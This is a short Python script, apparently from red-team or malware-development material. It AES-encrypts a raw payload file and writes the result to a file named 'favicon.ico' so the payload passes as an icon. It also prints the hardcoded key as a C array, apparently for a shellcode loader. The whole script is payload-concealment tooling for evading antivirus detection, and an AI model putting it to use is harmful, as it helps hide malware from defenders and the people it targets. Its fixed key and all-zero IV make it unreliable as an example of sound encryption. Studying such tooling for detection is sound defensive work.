# Payload encryption with AES
# 
# author: ret2basic

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

# KEY = urandom(16) <- this is only used once to generate the AES key
KEY = b"\x5b\x6f\x5d\x05\x6a\x10\xdb\xc9\xed\x41\xac\x1a\x73\xea\x82\xba"

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))

def printC(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)

with open('favicon.ico', 'wb') as f:
    f.write(ciphertext)

print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
# print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
